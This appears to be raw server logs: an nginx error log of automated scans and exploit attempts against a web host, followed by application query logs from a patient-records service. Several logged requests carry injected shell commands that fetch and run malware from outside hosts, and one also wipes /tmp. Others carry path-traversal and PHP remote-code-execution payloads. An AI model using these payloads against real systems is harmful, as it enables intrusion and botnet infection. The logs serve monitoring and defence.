+2026/05/28 23:49:03 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:03 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:04 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:04 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:05 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:06 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:07 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:08 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1", upstream: "http://127.0.0.1:8080/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello", host: "32.196.153.163:80"
+2026/05/28 23:49:08 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1", upstream: "http://127.0.0.1:8080/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello", host: "32.196.153.163:80"
+2026/05/28 23:49:09 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1", upstream: "http://127.0.0.1:8080/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php", host: "32.196.153.163:80"
+2026/05/28 23:49:09 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1", upstream: "http://127.0.0.1:8080/index.php?lang=../../../../../../../../tmp/index1", host: "32.196.153.163:80"
+2026/05/28 23:49:10 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /containers/json HTTP/1.1", upstream: "http://127.0.0.1:8080/containers/json", host: "32.196.153.163:80"
+2026/05/29 00:46:43 [warn] 18558#18558: *69 using uninitialized "year" variable while logging request, client: 130.185.119.80, server: , request: "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
+2026/05/29 00:46:43 [warn] 18558#18558: *69 using uninitialized "month" variable while logging request, client: 130.185.119.80, server: , request: "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
+2026/05/29 00:46:43 [warn] 18558#18558: *69 using uninitialized "day" variable while logging request, client: 130.185.119.80, server: , request: "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
+2026/05/29 00:46:43 [warn] 18558#18558: *69 using uninitialized "hour" variable while logging request, client: 130.185.119.80, server: , request: "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
+2026/05/29 00:46:43 [warn] 18558#18558: *70 using uninitialized "year" variable while logging request, client: 130.185.119.80, server: , request: "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"
+2026/05/29 00:46:43 [warn] 18558#18558: *70 using uninitialized "month" variable while logging request, client: 130.185.119.80, server: , request: "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"
+2026/05/29 00:46:43 [warn] 18558#18558: *70 using uninitialized "day" variable while logging request, client: 130.185.119.80, server: , request: "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"
+2026/05/29 00:46:43 [warn] 18558#18558: *70 using uninitialized "hour" variable while logging request, client: 130.185.119.80, server: , request: "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"
+2026/05/29 00:50:07 [warn] 18558#18558: *116 using uninitialized "year" variable while logging request, client: 151.243.11.35, server: , request: "GET / HTTP/1.1"
+2026/05/29 00:50:07 [warn] 18558#18558: *116 using uninitialized "month" variable while logging request, client: 151.243.11.35, server: , request: "GET / HTTP/1.1"
+2026/05/29 00:50:07 [warn] 18558#18558: *116 using uninitialized "day" variable while logging request, client: 151.243.11.35, server: , request: "GET / HTTP/1.1"
+2026/05/29 00:50:07 [warn] 18558#18558: *116 using uninitialized "hour" variable while logging request, client: 151.243.11.35, server: , request: "GET / HTTP/1.1"
+2026/05/29 01:14:19 [warn] 18558#18558: *118 using uninitialized "year" variable while logging request, client: 45.235.222.225, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 01:14:19 [warn] 18558#18558: *118 using uninitialized "month" variable while logging request, client: 45.235.222.225, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 01:14:19 [warn] 18558#18558: *118 using uninitialized "day" variable while logging request, client: 45.235.222.225, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 01:14:19 [warn] 18558#18558: *118 using uninitialized "hour" variable while logging request, client: 45.235.222.225, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 02:19:19 [warn] 18557#18557: *124 using uninitialized "year" variable while logging request, client: 177.103.27.167, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 02:19:19 [warn] 18557#18557: *124 using uninitialized "month" variable while logging request, client: 177.103.27.167, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 02:19:19 [warn] 18557#18557: *124 using uninitialized "day" variable while logging request, client: 177.103.27.167, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 02:19:19 [warn] 18557#18557: *124 using uninitialized "hour" variable while logging request, client: 177.103.27.167, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 02:46:06 [warn] 18557#18557: *128 using uninitialized "year" variable while logging request, client: 34.156.17.250, server: , request: "  i  eU§ärandom1random2random3random4   / "
+2026/05/29 02:46:06 [warn] 18557#18557: *128 using uninitialized "month" variable while logging request, client: 34.156.17.250, server: , request: "  i  eU§ärandom1random2random3random4   / "
+2026/05/29 02:46:06 [warn] 18557#18557: *128 using uninitialized "day" variable while logging request, client: 34.156.17.250, server: , request: "  i  eU§ärandom1random2random3random4   / "
+2026/05/29 02:46:06 [warn] 18557#18557: *128 using uninitialized "hour" variable while logging request, client: 34.156.17.250, server: , request: "  i  eU§ärandom1random2random3random4   / "
+2026/05/29 04:01:59 [warn] 18558#18558: *147 using uninitialized "year" variable while logging request, client: 45.187.7.202, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 04:01:59 [warn] 18558#18558: *147 using uninitialized "month" variable while logging request, client: 45.187.7.202, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 04:01:59 [warn] 18558#18558: *147 using uninitialized "day" variable while logging request, client: 45.187.7.202, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 04:01:59 [warn] 18558#18558: *147 using uninitialized "hour" variable while logging request, client: 45.187.7.202, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 04:17:33 [warn] 18558#18558: *149 using uninitialized "year" variable while logging request, client: 151.243.11.35, server: , request: "GET / HTTP/1.1"
+2026/05/29 04:17:33 [warn] 18558#18558: *149 using uninitialized "month" variable while logging request, client: 151.243.11.35, server: , request: "GET / HTTP/1.1"
+2026/05/29 04:17:33 [warn] 18558#18558: *149 using uninitialized "day" variable while logging request, client: 151.243.11.35, server: , request: "GET / HTTP/1.1"
+2026/05/29 04:17:33 [warn] 18558#18558: *149 using uninitialized "hour" variable while logging request, client: 151.243.11.35, server: , request: "GET / HTTP/1.1"
+2026/05/29 04:29:09 [warn] 18558#18558: *150 using uninitialized "year" variable while logging request, client: 89.58.31.64, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 04:29:09 [warn] 18558#18558: *150 using uninitialized "month" variable while logging request, client: 89.58.31.64, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 04:29:09 [warn] 18558#18558: *150 using uninitialized "day" variable while logging request, client: 89.58.31.64, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 04:29:09 [warn] 18558#18558: *150 using uninitialized "hour" variable while logging request, client: 89.58.31.64, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 05:25:56 [warn] 18558#18558: *155 using uninitialized "year" variable while logging request, client: 205.210.31.154, server: , request: " Ê  Æúo·ïêúfÈ+ÉìØEFÞ¼ñ¬)¼ï0ô8’Þ{3"  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ"
+2026/05/29 05:25:56 [warn] 18558#18558: *155 using uninitialized "month" variable while logging request, client: 205.210.31.154, server: , request: " Ê  Æúo·ïêúfÈ+ÉìØEFÞ¼ñ¬)¼ï0ô8’Þ{3"  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ"
+2026/05/29 05:25:56 [warn] 18558#18558: *155 using uninitialized "day" variable while logging request, client: 205.210.31.154, server: , request: " Ê  Æúo·ïêúfÈ+ÉìØEFÞ¼ñ¬)¼ï0ô8’Þ{3"  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ"
+2026/05/29 05:25:56 [warn] 18558#18558: *155 using uninitialized "hour" variable while logging request, client: 205.210.31.154, server: , request: " Ê  Æúo·ïêúfÈ+ÉìØEFÞ¼ñ¬)¼ï0ô8’Þ{3"  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ"
+2026/05/29 05:25:56 [warn] 18558#18558: *154 using uninitialized "year" variable while logging request, client: 205.210.31.154, server: , request: " î  ê=Ãb§ýñË=ZaÅ;çˆ„-ÓwtÐªA|ä B'Å ¤7£ð®pöjîÇÛ?ª,/O¨}²€‹m9‰¸à= &À+À/À,À0Ì©Ì¨À	ÀÀ"
+2026/05/29 05:25:56 [warn] 18558#18558: *154 using uninitialized "month" variable while logging request, client: 205.210.31.154, server: , request: " î  ê=Ãb§ýñË=ZaÅ;çˆ„-ÓwtÐªA|ä B'Å ¤7£ð®pöjîÇÛ?ª,/O¨}²€‹m9‰¸à= &À+À/À,À0Ì©Ì¨À	ÀÀ"
+2026/05/29 05:25:56 [warn] 18558#18558: *154 using uninitialized "day" variable while logging request, client: 205.210.31.154, server: , request: " î  ê=Ãb§ýñË=ZaÅ;çˆ„-ÓwtÐªA|ä B'Å ¤7£ð®pöjîÇÛ?ª,/O¨}²€‹m9‰¸à= &À+À/À,À0Ì©Ì¨À	ÀÀ"
+2026/05/29 05:25:56 [warn] 18558#18558: *154 using uninitialized "hour" variable while logging request, client: 205.210.31.154, server: , request: " î  ê=Ãb§ýñË=ZaÅ;çˆ„-ÓwtÐªA|ä B'Å ¤7£ð®pöjîÇÛ?ª,/O¨}²€‹m9‰¸à= &À+À/À,À0Ì©Ì¨À	ÀÀ"
+2026/05/29 05:53:35 [warn] 18558#18558: *167 using uninitialized "year" variable while logging request, client: 216.180.246.201, server: , request: " ý  ù“‚o»\žòœ0bŽ§Ù4*ÊxŸ°e™îå¸6Xý¸ñ Æ:åßÒ‘·)ñ×zÐx V¶5Ì‰ÎÄÌd<ººm¥ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/05/29 05:53:35 [warn] 18558#18558: *167 using uninitialized "month" variable while logging request, client: 216.180.246.201, server: , request: " ý  ù“‚o»\žòœ0bŽ§Ù4*ÊxŸ°e™îå¸6Xý¸ñ Æ:åßÒ‘·)ñ×zÐx V¶5Ì‰ÎÄÌd<ººm¥ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/05/29 05:53:35 [warn] 18558#18558: *167 using uninitialized "day" variable while logging request, client: 216.180.246.201, server: , request: " ý  ù“‚o»\žòœ0bŽ§Ù4*ÊxŸ°e™îå¸6Xý¸ñ Æ:åßÒ‘·)ñ×zÐx V¶5Ì‰ÎÄÌd<ººm¥ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/05/29 05:53:35 [warn] 18558#18558: *167 using uninitialized "hour" variable while logging request, client: 216.180.246.201, server: , request: " ý  ù“‚o»\žòœ0bŽ§Ù4*ÊxŸ°e™îå¸6Xý¸ñ Æ:åßÒ‘·)ñ×zÐx V¶5Ì‰ÎÄÌd<ººm¥ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/05/29 06:50:38 [warn] 18557#18557: *185 using uninitialized "year" variable while logging request, client: 217.142.25.132, server: , request: "GET /login.cgi?cli=aa%20aa%27;wget%20http://140.233.190.47/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1"
+2026/05/29 06:50:38 [warn] 18557#18557: *185 using uninitialized "month" variable while logging request, client: 217.142.25.132, server: , request: "GET /login.cgi?cli=aa%20aa%27;wget%20http://140.233.190.47/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1"
+2026/05/29 06:50:38 [warn] 18557#18557: *185 using uninitialized "day" variable while logging request, client: 217.142.25.132, server: , request: "GET /login.cgi?cli=aa%20aa%27;wget%20http://140.233.190.47/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1"
+2026/05/29 06:50:38 [warn] 18557#18557: *185 using uninitialized "hour" variable while logging request, client: 217.142.25.132, server: , request: "GET /login.cgi?cli=aa%20aa%27;wget%20http://140.233.190.47/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1"
+2026/05/29 08:32:44 [warn] 18558#18558: *281 using uninitialized "year" variable while logging request, client: 37.60.250.226, server: , request: " "
+2026/05/29 08:32:44 [warn] 18558#18558: *281 using uninitialized "month" variable while logging request, client: 37.60.250.226, server: , request: " "
+2026/05/29 08:32:44 [warn] 18558#18558: *281 using uninitialized "day" variable while logging request, client: 37.60.250.226, server: , request: " "
+2026/05/29 08:32:44 [warn] 18558#18558: *281 using uninitialized "hour" variable while logging request, client: 37.60.250.226, server: , request: " "
+2026/05/29 08:47:22 [warn] 18558#18558: *282 using uninitialized "year" variable while logging request, client: 150.228.181.35, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 08:47:22 [warn] 18558#18558: *282 using uninitialized "month" variable while logging request, client: 150.228.181.35, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 08:47:22 [warn] 18558#18558: *282 using uninitialized "day" variable while logging request, client: 150.228.181.35, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 08:47:22 [warn] 18558#18558: *282 using uninitialized "hour" variable while logging request, client: 150.228.181.35, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+2026/05/29 09:19:38 [warn] 18558#18558: *286 using uninitialized "year" variable while logging request, client: 210.87.84.86, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 09:19:38 [warn] 18558#18558: *286 using uninitialized "month" variable while logging request, client: 210.87.84.86, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 09:19:38 [warn] 18558#18558: *286 using uninitialized "day" variable while logging request, client: 210.87.84.86, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 09:19:38 [warn] 18558#18558: *286 using uninitialized "hour" variable while logging request, client: 210.87.84.86, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1"
+2026/05/29 11:17:50 [warn] 42062#42062: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2026/05/29 11:17:51 [warn] 42095#42095: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2026/05/29 11:17:51 [warn] 42096#42096: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2026/05/29 11:56:11 [warn] 42099#42099: *3 using uninitialized "year" variable while logging request, client: 45.205.1.71, server: , request: "GET / HTTP/1.1"
+2026/05/29 11:56:11 [warn] 42099#42099: *3 using uninitialized "month" variable while logging request, client: 45.205.1.71, server: , request: "GET / HTTP/1.1"
+2026/05/29 11:56:11 [warn] 42099#42099: *3 using uninitialized "day" variable while logging request, client: 45.205.1.71, server: , request: "GET / HTTP/1.1"
+2026/05/29 11:56:11 [warn] 42099#42099: *3 using uninitialized "hour" variable while logging request, client: 45.205.1.71, server: , request: "GET / HTTP/1.1"
+2026/05/29 12:02:03 [warn] 42098#42098: *4 using uninitialized "year" variable while logging request, client: 204.76.203.10, server: , request: "GET / HTTP/1.1"
+2026/05/29 12:02:03 [warn] 42098#42098: *4 using uninitialized "month" variable while logging request, client: 204.76.203.10, server: , request: "GET / HTTP/1.1"
+2026/05/29 12:02:03 [warn] 42098#42098: *4 using uninitialized "day" variable while logging request, client: 204.76.203.10, server: , request: "GET / HTTP/1.1"
+2026/05/29 12:02:03 [warn] 42098#42098: *4 using uninitialized "hour" variable while logging request, client: 204.76.203.10, server: , request: "GET / HTTP/1.1"
+2026/05/29 12:15:19 [warn] 42098#42098: *5 using uninitialized "year" variable while logging request, client: 45.41.105.49, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://85.11.167.101/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%20http://85.11.167.101/arm64%20-O%20/tmp/arm64;chmod%20777%20/tmp/arm64;/tmp/arm64;wget%20http://85.11.167.101/mips%20-O%20/tmp/mips;chmod%20777%20/tmp/mips;/tmp/mips%27/&sessionKey=1039 HTTP/1.1"
+2026/05/29 12:15:19 [warn] 42098#42098: *5 using uninitialized "month" variable while logging request, client: 45.41.105.49, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://85.11.167.101/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%20http://85.11.167.101/arm64%20-O%20/tmp/arm64;chmod%20777%20/tmp/arm64;/tmp/arm64;wget%20http://85.11.167.101/mips%20-O%20/tmp/mips;chmod%20777%20/tmp/mips;/tmp/mips%27/&sessionKey=1039 HTTP/1.1"
+2026/05/29 12:15:19 [warn] 42098#42098: *5 using uninitialized "day" variable while logging request, client: 45.41.105.49, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://85.11.167.101/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%20http://85.11.167.101/arm64%20-O%20/tmp/arm64;chmod%20777%20/tmp/arm64;/tmp/arm64;wget%20http://85.11.167.101/mips%20-O%20/tmp/mips;chmod%20777%20/tmp/mips;/tmp/mips%27/&sessionKey=1039 HTTP/1.1"
+2026/05/29 12:15:19 [warn] 42098#42098: *5 using uninitialized "hour" variable while logging request, client: 45.41.105.49, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://85.11.167.101/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%20http://85.11.167.101/arm64%20-O%20/tmp/arm64;chmod%20777%20/tmp/arm64;/tmp/arm64;wget%20http://85.11.167.101/mips%20-O%20/tmp/mips;chmod%20777%20/tmp/mips;/tmp/mips%27/&sessionKey=1039 HTTP/1.1"
+2026/05/29 13:33:45 [warn] 47032#47032: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2026/05/29 13:33:45 [warn] 47065#47065: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2026/05/29 13:33:45 [warn] 47066#47066: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+
+
+----------------------------------------
+/var/log/web.stdout.log
+----------------------------------------
+May 29 13:37:08 ip-172-31-22-190 web[47021]:    constraint: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:    file: #033[32m'parse_relation.c'#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:    line: #033[32m'1466'#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:    routine: #033[32m'parserOpenTable'#033[39m
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  },
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  length: #033[33m124#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  severity: #033[32m'ERROR'#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  code: #033[32m'42P01'#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  detail: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  hint: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  position: #033[32m'864'#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  internalPosition: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  internalQuery: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  where: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  schema: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  table: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  column: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  dataType: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  constraint: #033[90mundefined#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  file: #033[32m'parse_relation.c'#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  line: #033[32m'1466'#033[39m,
+May 29 13:37:08 ip-172-31-22-190 web[47021]:  routine: #033[32m'parserOpenTable'#033[39m
+May 29 13:37:08 ip-172-31-22-190 web[47021]: }
+May 29 13:37:43 ip-172-31-22-190 web[47021]: query: SELECT "PatientEntity"."id" AS "PatientEntity_id", "PatientEntity"."active" AS "PatientEntity_active", "PatientEntity"."tenant_id" AS "PatientEntity_tenant_id", "PatientEntity"."dni" AS "PatientEntity_dni", "PatientEntity"."family_name" AS "PatientEntity_family_name", "PatientEntity"."given_name" AS "PatientEntity_given_name", "PatientEntity"."gender" AS "PatientEntity_gender", "PatientEntity"."birth_date" AS "PatientEntity_birth_date", "PatientEntity"."payload" AS "PatientEntity_payload", "PatientEntity"."created_at" AS "PatientEntity_created_at", "PatientEntity"."updated_at" AS "PatientEntity_updated_at" FROM "fhir_patients" "PatientEntity" WHERE (("PatientEntity"."dni" = $1) AND ("PatientEntity"."tenant_id" = $2)) LIMIT 1 -- PARAMETERS: ["98989","mi_consultorio_dent_hce"]
+May 29 13:37:43 ip-172-31-22-190 web[47021]: query: START TRANSACTION
+May 29 13:37:43 ip-172-31-22-190 web[47021]: query: INSERT INTO "fhir_patients"("id", "active", "tenant_id", "dni", "family_name", "given_name", "gender", "birth_date", "payload", "created_at", "updated_at") VALUES (DEFAULT, $1, $2, $3, $4, $5, $6, $7, $8, DEFAULT, DEFAULT) RETURNING "id", "active", "created_at", "updated_at" -- PARAMETERS: [1,"mi_consultorio_dent_hce","98989","cesar","julio","male","2002-12-12","{\"resourceType\":\"Patient\",\"active\":true,\"identifier\":[{\"use\":\"official\",\"type\":{\"coding\":[{\"system\":\"http://terminology.hl7.org/CodeSystem/v2-0203\",\"code\":\"NNARG\",\"display\":\"National Person Identifier\"}]},\"system\":\"http://hospital.gov/dni\",\"value\":\"98989\"}],\"name\":[{\"use\":\"official\",\"family\":\"cesar\",\"given\":[\"julio\"]}],\"gender\":\"male\",\"birthDate\":\"2002-12-12\",\"telecom\":[{\"system\":\"phone\",\"value\":\"6523\",\"use\":\"home\"},{\"system\":\"email\",\"value\":\"julio@gmail.com\",\"use\":\"home\"}],\"address\":[{\"use\":\"home\",\"type\":\"both\",\"line\":[\"lkjhj\"],\"city\":\"hjhkj\",\"country\":\"Argentina\"}],\"extension\":[{\"url\":\"http://hospital.gov/fhir/StructureDefinition/admission-date\",\"valueDateTime\":\"2026-05-29T13:37:43.063Z\"}]}"]
+May 29 13:37:43 ip-172-31-22-190 web[47021]: query: COMMIT
+May 29 13:37:43 ip-172-31-22-190 web[47021]: query: UPDATE "fhir_patients" SET "payload" = $1, "updated_at" = CURRENT_TIMESTAMP WHERE "id" = $2 -- PARAMETERS: ["{\"resourceType\":\"Patient\",\"active\":true,\"identifier\":[{\"use\":\"official\",\"type\":{\"coding\":[{\"system\":\"http://terminology.hl7.org/CodeSystem/v2-0203\",\"code\":\"NNARG\",\"display\":\"National Person Identifier\"}]},\"system\":\"http://hospital.gov/dni\",\"value\":\"98989\"}],\"name\":[{\"use\":\"official\",\"family\":\"cesar\",\"given\":[\"julio\"]}],\"gender\":\"male\",\"birthDate\":\"2002-12-12\",\"telecom\":[{\"system\":\"phone\",\"value\":\"6523\",\"use\":\"home\"},{\"system\":\"email\",\"value\":\"julio@gmail.com\",\"use\":\"home\"}],\"address\":[{\"use\":\"home\",\"type\":\"both\",\"line\":[\"lkjhj\"],\"city\":\"hjhkj\",\"country\":\"Argentina\"}],\"extension\":[{\"url\":\"http://hospital.gov/fhir/StructureDefinition/admission-date\",\"valueDateTime\":\"2026-05-29T13:37:43.063Z\"}],\"id\":\"767d2ee8-e07e-4d10-a416-39b78bcb27e7\"}","767d2ee8-e07e-4d10-a416-39b78bcb27e7"]
